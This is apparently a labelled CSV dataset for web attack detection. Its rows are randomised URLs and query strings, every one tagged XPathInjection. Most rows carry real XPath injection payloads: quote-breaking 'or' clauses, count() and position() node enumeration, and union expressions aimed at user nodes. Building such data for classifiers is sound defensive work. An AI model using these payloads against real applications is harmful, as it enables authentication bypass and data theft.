id,class,vector
122,XPathInjection,/ta8OHT3edyodzmSv/otr0i/hoCtr/71r/nnf@7Q7aV2t2w/jn_0/cmd._h5/ooNmketeiyo/ZnshnhI12wloh8mn.css?tet=3211016&tdslou=0I0s&d5dlmedot=tt19%27+or+++1%3C+++++rsl%2Faz%2FucsY%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D1%5D+or++++%27ae6neak%27++++%3D++%27&e7ii1soh3nkint=srb&1GB1scxpj=gtbH&qaqteIwh=20&YHetcM2.p=kt5rnibk45L+ewinntprocessing-instruction&rt2l=koevalh2tdl&Drg=ocmdeselorlyyr
129,XPathInjection,/heredoleu/ezUNMJ/eheetTraoh0detcem/nryad4az8ds1nvi/ysxLeJs/icv2y2e2/sp@j4zY9BHL-ybCYGjS/i6bezenescrv/umVs6JRF4x/nhQle50mlq3T.jpeg?id=inustttjsigenlAv&kaskat=nmeuiohn%27++++or+++++6+++++%3C+++count%28path%2Fchild%3A%3A*%29+++or++%27m595u0t9%27++%3D%27&da5=stimotRtrOaq7ywo
132,XPathInjection,/wdW6/dH2BF@JXqz/hirog2etth1b4g/sFJAHY0nodeHPq/iQeByBL/e4YBice53DPk7/sudktnrzaezsnrP/e@Byr3mbrOIXFKkrp/gytd4laaefesiysfit9f/ep0wFo2ZokTZ9Q.cgi?emre=%28i++%3C+count%28TtymY%2Fchild%3A%3Atext%28%29%29++++and++j+++%3C++count%28hsoun%2Fchild%3A%3Acomment%28%29%29+and+++k+%3C+++++count%28alcfTe%2Fchild%3A%3A*%29+%29&fey6TcytoAur=o+%26e6SiidlibhavingsiR+ntsock_stream%27t&URfr0=09438497
141,XPathInjection,/aCNnf.exe?sr1=%28i++++%3C+count%28dx%2Fchild%3A%3Atext%28%29%29+++and+++++j++++%3C++++count%28ca%2Fchild%3A%3Acomment%28%29%29++and+++k+%3C++count%28bts%2Fchild%3A%3A*%29++++%29
145,XPathInjection,/ybryXFOtWSp1lI.php?
149,XPathInjection,sjdZtmpEFI=6lyden&Scopy_8C2kWF=8936075643
167,XPathInjection,/dWQvTpF1BcwlwhP5w/isYjC/n-eMd/neet.cfm?ZnWadminvY5=994458&o3aeititCheu9m=cFEIraruluSvelaelH&RAgid@1_k9=2622&Ji8piEaTwem=ojvmyF4&hpaohezneueoi=yte%24%25tlcrymWn&dr2ee=nVXKbBV%40SvI4&PoalmtncqZcb=otwndn&@hlocationBpdNyRcI=er21o&ralatogao=ir%2Fba%2Fmi%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D782%5D+++or+++++%27Afxfnku%27%3D+++%27&vtbihtdr6=tdnOssnGl5nple&1m8PAHQx=l&onst75ku=9BgK.BihI.n9&4@LoKXcG5p4=236&documentnqkPf_=euspn%3Dohnselecte1u&utocn=ox7AcyrB
168,XPathInjection,/eyv0PZAwq6FY/bxb/execLapW5div._/t2/sgoo.php3?epvhMget6dt=ronqrhtk&IeP1e7oscneoysf=cnh&pasa=34642205&AaHxm6ehrwi=Ldth&vnnsdoha81dhcA=6194+++++or++++1%3C++++1mesy%2Fti1sf%2Fa%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D2%5D+++++or+++++8861%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27
172,XPathInjection,/ap786AselectsN/n_/ttieAlamwhfniizcjc/4he6lOgqNjgIc/rtvxYsqGJIJFlzgZ/CQSY1vT43XWR02/mQ8HpRM1c.htm?5RincludeVcr5zD6=ee4M7mvLu&SSx6XFR5N1=ra%5DN0eh&ihrmsZplc=0557186387&msIqyectayzoo=snboxiae%27+++or++6++%3C+++count%28path%2Fchild%3A%3A*%29+or++++%27itdt%27+%3D++++%27&3eatesA=4695
197,XPathInjection,/lsGzV1n/pNs8q/ajhifmai/o@Z8b3R/ygsjhrjGcoadoistieRt.aspx?df3cdmeat=eepnd5oxdip+%5Dbistof&positioneY4=t5abgee%27+++or+path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D++++or++++%2741hecd%27%3D++++%27&S8rlo8osoEie=06173&t1taltbdiprh8u=ejPnTEsLpN&h20a2=ires&rn=iafwl8eih8se&bo3k0=3128996631&iachlfdgtbng=fo2havinggeycguatrr%7Casy2a&slmO7nalYiastEq=execexecsuinlNNe2yRt%40t5&bisuacaoretitoo=2e+Ccopyi%29pcn39euttoformsr&osagt=sbn+i&4AjOlnGuw6ebhve=utmwaay
198,XPathInjection,/cviceasricTtm6pomx/enforuso1eawh/0hzZKH4qWQyRpH9co@/jrJdP1LvZWGtsf_f/8ics1ll0m5mle/VckCsKa@Pv/ofgpedagmnxh2H.jpg?ehb9te=zgsnEnetcatp&0ds5esrpttdsex=8996419826&uBT@.Ereplace_j=tre%27+or+++6+++%3C+count%28path%2Fchild%3A%3A*%29+or++++%27Pdhu%27+++%3D+%27&eehms=enlrnqr&gmaI=534&Fv_V=rp%29&OncnyryToI=gnic&qoimr=8&etd=nl&i5gost=7019180209&otueayuIieon=058691322
205,XPathInjection,o2p1bh9t=?maa=a teishutdownO&tni=ebn&dOnUdevEm=cino&xabmarrwitUon=ydpt8H&S1BbXx_T=hHMx&ebREa=1l5c&sot82nla=77170&jJKtemeta0avL=mfhci/no9/a7huq0/child::node()[    position()=4]  |    hi/seo/ysyt/child::text()[position()=615] or  'xp'  =   '&so3eonoeiseyjth=1ywiectnxtermtloghiewna&mN4rgnnhT=sLY&-lbnq_bwSE=3
210,XPathInjection,/cA/positionzwZHaMN/oGrhttp@X/jkyBPYD/igozpO0OtRe3SFcoIT.shtml?emy8=Ioegselect&wuesaK7gt=f&insertF4Eq-J4H=nr%26e%2F%5CeoATraerxrol&oniDwieharnhe=bore%2Fdh%2FoaQg2e%2Fchild%3A%3Anode%28%29%5B++position%28%29%3D523%5D+++%7C++ni%2Fss7a7E%2Ftoenn%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D0%5D++++or++++%27eoMre%27%3D+%27
214,XPathInjection,/hieoye2rtr/sVH@/eZOOFt4zNBh6fYIViz6/2r/hishgsei1/hyhrsJe32e/deds7dleNe7ibD.tiff?ooeo=71+++++or+++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+++%7C+++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++++or+++535%3D
216,XPathInjection,en=i8R4qBwaQ&p6xlhn=N&ziacceptdVdrop=Dtiinputu&ueimasIEg1pm=6H9sdeoiraa&oFun=tn0rseqsupdategteit&M9Beval=033113&ifandphpuKeSm9Em=3418&Oink8Emiqtescr=samtcrmfrs 3:ebgsounde>childcae&ca=76804623&4cociQego=541
219,XPathInjection,/let/l8oabcfireosdno/aYK5XkxeDSBo7Gw/ehaetanHrcmitzoor5/ojoe/EetiajymNil/lse/cLgcHXNDkQCj/wWmrgpZ4/ldhi2iyibu/oGFIMSqoCwT7.mdb?9e1snb1iy=%26getoc&cs=367084&etmtllrnlta=48962728&r2XaW5Dz8eAiltl=m4esI%27+++++or++++count%28+++path%2Fchild%3A%3Anode%28%29%5Bposition%28++++%29%3D%28%28+i+%2B+++j+++%2B++++k%2B++++l+%2B+1%29%5D+%7C+++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++or+%27hrd%27++++%3D++%27+++cL%27++or&6ahwehi=l32sthfNhh&p0waeeKiudciia=481&eieeeT=3Eh6h1&5_@Ewget0rapA=peV9x4_H
222,XPathInjection,/eirre7eeiifnds/t0R1u5Kec5hdEb.php3?wni5rEhaRgyw=bitlug%27%5D+%7C+P+%7C++++%2F%2Fuser%5B+++name%2Ftext%28+++%29++%3D++++%27tet
226,XPathInjection,edsinnTl=iyt1ea6;e e kaoYias&1pareegryloa=88871     or     count(path/child::node()[position()=((i+j+k+l+1)]    |  path/child::*()[position()=(k+1)])=1 or   4043=
249,XPathInjection,/spFfUhYcSG4e4-pga/Dblowagr/usaigc/2ay/ownhetdadlhe.swf?jKorad=nXwVXuQ2&yeexqi=5&zhRZrah=40401756&xraaSissis=l2aebnTs&tV3Lp-_FoSEm=0934&C3BJNxo.3f=n%26ecPadoy&eeSyeaemoae=3956169&n1E=38&oa=gyrtgov1nalhfrd6il&aSdvbscript=bhh&cwindow.openj7k=evobUytBQ&adTrbben8ig=5859+or++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D++++%7C+++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+++++or+++9827%3D&xwbeeaehcureedH=%5BteE4T%25&wrekeTed=m%7Eof+
254,XPathInjection,/oty6tiaWweupan7e/ipisyiabzneyiynie/nddiEeeoh/umdtsrwttw5av/Ancbgsound/tluewilhytsec1i/uAse4uLi/AsLJ673p/Set2s/yVtq/i0xdu/uecdefatteanxs4n7e.exe?6eitty5rbSOi=lega&RYPD0atelnet.=h4atthjatmceatz4&st=149170&aflhiwAnozio=01601&es9ndzt29jmrst=ebetbw%27+++or++1%3C+++enw%2FdrKhqn%2Fnyaea%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D403%5D++or++++%27ra%27%3D+%27&yheer5tver=taeh1Iee&Ui-DFXsX=mnurhessegtDsnce&enwqeWgana=x&mgrtH=7ihkA&8sipnfeedfsg2bo=780887482&le9E1ro6rhu75=sbHosUac
255,XPathInjection,AxurnOeohiLU6st=te5>i&e@7_Qp5VgOU3=3849&5t=gaz3yyNof&Bwexec8OvYcmdZC9=e45GbP2&Jjhqweo85evre=miizy&rR=w uav&8XM22hICot2p=lhhdecinrdatba&fmedno=72&e89Tt=a57dc2>uiad&eHn2tr=0585&rgLupdatek-SCLFd=46&iineGopge=kcs
260,XPathInjection,/vHLffcconnectwindow.open_CbF/syLYkTY3b/wnne4iseo2ha/ttotxy.nsf?sHdrAc0anyY5n=rauaen%2Ft3Nvn%2Ft%2Fchild%3A%3Anode%28%29%5B+++++position%28%29%3D830%5D+%7C+++++t%2Fuerv8s%2Fgyem%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D539%5D++or++++%27idsnp%27++%3D++%27&msnocfnse=66717&ijh2=51078485&ietuoxFr=265045&BGJlMSFwp-M4=9&eE=hhe5lSlEiMoDad&er2gsolooe=yea&onoe=s+0&coerorhoieert=48e4t1&or4eyiliwi19ury=9849377
263,XPathInjection,/rtQJ8ewrNt/wSATRHt0cYzx_nM-Ntl/ITU0GVk/e4/wFemoG0k16zjONdgDc/tYUg0VG1vP8H0dKG/8n/wCe/Py@X8ZQrYUqNAB/oYuoAD/esaiejrgoewfsy9jtok.tiff?wttdonetiubei=1&oqbEaothogt=tn&3s98m1exduitn=turn%27+++++or+6++%3C+++++count%28path%2Fchild%3A%3A*%29++++or+++++%27yse%27+%3D+%27&y2h=40&oeneu=from&zs79alhx=yltsakeRou
266,XPathInjection,/egr/8al6GqNBxKx@Dww/tHcoThgy8IxYpNoibH8b/u2zlh5UpKcpassthrucq1c/netrreiglAoGnaaiaa/rymit/eMW@BCcE4-bk2uf/cF/is_N9i2of9i/o4e.Ka.US0a.js?ti=4+++++or+lzcn%2Fabbtxm%2Ftonay%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D9%5D++or++++19941%3D&ncEtnaEbmpeRih=38555517&crvri3iht=9&lo2e=aejsoUhlo2gdta&9aahnoamegCh7n=ghnnatd&tt19men=Jn3pes4dph&nxhaadryL=bfXC&WU@cBif=0565899260&eksre=l5a1odbmnhohtl1bs&vtietcrlhnd=eOistutm
273,XPathInjection,/NLMlPaccess_logWf9U/5oVi4detwcnnvhrtE4nr/tri/hsRf1/iTw/lm/eSA05_NGpYCZgL/eanmpaadd/gLC.jj_R.cgi?6kq3nzrs=235+or++++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+++%7C+++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+++or++++1821%3D
283,XPathInjection,/telnetb/nzoHe4ydlnHeeahiri/g@CE_j%uvvarlA/pwetosaes4gSj.html?ejtgkMlafstn=elp&uhodsisrA9rgeae=s6phnlE%27+++or+++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+++++or+++++%27rsm%27++%3D++%27&uedn=hXN8Y1t&aOm6eu=ni%27me&_winnt7htaccesCEL=sy
292,XPathInjection,/29o_WlNF/np/yw7sVyRdDYF7JqW-YR.bin?et6zshaiiw=it%29n5xl7&wacjlhwij=oANXtpJ-j7&4eT6eAseiy=hrseriaretia6poah&Wcrg1UtgininR=ssebwogmntisiih&esliAsaro=3&wwdpVoPg=34lT&sv97enooasknHa3=iEbnz%26Cr&tQlAg4xGYjZ=527&nl=irta&nN=7833&mtageAhotwk5b=%28i+++%3C+++count%28ysen6%2Fchild%3A%3Atext%28%29%29++++and+j+%3C++++count%28dmnneo%2Fchild%3A%3Acomment%28%29%29+++++and+++++k+++%3C+count%28dpfr%2Fchild%3A%3A*%29++%29&niihoSe0yi=rkstdinjei%24&sLS16hosemae=exnhefLeeDaeRNIeh&aeydhcuonf=sdlhd&veeuteznOotan6y=no%3Ea
301,XPathInjection,/niaoaertslyerhmahnr/jaebTnoezere/o1u0UQFaUYxVPz@/eOApGqY/qG/N7udLs/sgsLDnNR8dnRev.jpg?Nate6=D%27&pcaatuzhhems=iih&7ag9rismfrbue0e=zevnvhsr+o&Hhft=e+zx&tnuntdhtRy=atfinsert&sdyT=5&aNaDAscde8htfa=hre4%2Fae&sscriptHv@=pl7&z@c-TsamvoIG@T=tordriRtqI&haE4hh=eg&lsiksMfp5anTztu=286&5emaetcr=o3t2ptse&vJ1perlpeIO5Lhome9=enm%2Fi%2FOatar%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D4%5D+++++or+++%27lhern9%27+++%3D++++%27&sqod6euou2w=+%40
309,XPathInjection,/as2oneSdiOzhportsvS/pf2qjnEeoTtKrssa4oe.jpeg?t1he7ir0r=07557+++++or+++ot%2FnIn%2Fanhsr%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D39%5D+or++708%3D&iee=nz6
310,XPathInjection,Ee2ieesuun=h&lIZmbgsoundvM=nm_fO&t1abmlthdepmn=iceeb5ittsjen0cs&st=6022913&iftpjp=nme/reisn/rtbon/child::node()[   position()=5]    | ceeo/ijmhE/n/child::text()[position()=1]    or 'Rq0el'= '&e9O=lZnino0mto&eyInB=jx7MKEP0t4ZA
320,XPathInjection,/6rqIa3@e6j6awXV/Ii_Xy6/1sCfhehfq/Z5JPcBKJ/as8tq/gl3stobyrRfjye/Y0eyt/e576udp/kluaY9bUhunlaeag/7dtteWnav09/u6-nl9qotEnsFt_1Xq/ahs3isaytire.asmx?02t7=3&.wY6=32941&dTPREd3fwhere=8&NmIdtpCn=e6a%27+++++or+path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+++or+%27oStcr%27+%3D++%27&a0Inenieqoeaepo=1162&httpVz1.Iu=529458&eM2q=sheil
332,XPathInjection,/oRUfUYfuuXMd2WaM7m/tFbU8r/hD.GsbyAYX0..jpeg?btEeMa=gBtQgXTWWwo3&efer=910+or++onni%2Fseei%2Fb%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D4%5D++or+++9771%3D&Zdrop6YL=tidmt%29na&tjornhjzbcsoda=nzrp&attYnses=n6uazevalsrre
337,XPathInjection,/ooyM9hWxgvrNxf6CGe-g/tJga63WT9I/evnKmsw/zd/wfcufnReDite8cio/hu_ts3x@iD.k/anszGlHruGJaYmfpnH/c_Wr/8hsOosrtbtmq/nh0snzDhnedcnjhao/g-tneh/5VMhHlF.0S06jiHCI5qg.shtml?siloy=ishieoechwnrfedT&wgfa=ts%28ee&goa4gprmwtatHnh=braim0tpgmelee&1atiaeewt1=cHn7yw&errAxi=0&sinputMDzI=d+yyg&ldcreplacegpSiframeCMZv=nQiyJGzbA1A&tiWFa2PwAe=17&rossEyna6dbs=nh%25jdiv2lhte&4oia72Dcao=sASkn&toktxc6osb=heH%27+or++++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D++++or++%27e2%27+%3D+%27&ftib=o5e&.nmnQB09z=%7Ce&Q.OgREoMochild=taLioi
341,XPathInjection,agei2ss9ynosr=08&laduftjj9=lharIoiTren&r6zDuR=po(e;i/
349,XPathInjection,/Gh6.IT/lHx5v3PF/NN-WJA/ouEseareeCep/Rf/hEtxxlX/6b/egulh75nvn7.php?mteeOcld=0&coe6I6n5i=feutn
362,XPathInjection,/nniscssadtrcee/Jcu/q3bp0hhttp/0cteNoer1aaeosn/oaeoplD/hMTsmS.sh?bpra7tnAt7Fxwd=v&iinhEctHia0=ePHd&Ucetnnl9iYrW=numktR9Zdocetceeao&RXiehtdg95n7iat=Eiframen%7EeGeth&odnhtko=rh+rlure%3Dteeetoco&iSs0gloueve=41++++or++++r%2Ftop%2FzdSsh%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D5%5D+++or+++++6%3D
368,XPathInjection,/ousbwnen2h9n.gif?kv2.njwRKkK=9&nltHtsnv=jQP%40S4&hltlds=onm8%27%5D+++++%7C++P+++%7C++++%2F%2Fuser%5B+++++name%2Ftext%28%29++++%3D+++%27roXrh&dautkszonmnoal=etzonboo79etc&et3=083481&mochaseHE=78385757&lixipfh1loOe=pah
387,XPathInjection,/acutneen7hpgDcsOs/sestdincopymO5O6XXks/nQRl580Y9b1RQgxqo7no/3W9iDUakS/e3-lWHV@-Fc079E/nw/cfqH/ens9nfeifl/essLY3YS/ihc2dlGeiqhaEetuxsu.html?rgtm8yo=dlB&ufdthiEtlseh=oigdnose2x+aui&yupassthruInph-o-=eyynUgE-izt8&oi4earh=9187160&xriDie=c%3F&on40=556141&imhitOhnseCtmu=41&dna=023062&shutdownXwXn9Ju0n=ehtdhcm&aeoLBeeteteun=rGtl3s%27+++++or+++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+or+++++%27Fjeo%27++++%3D++++%27
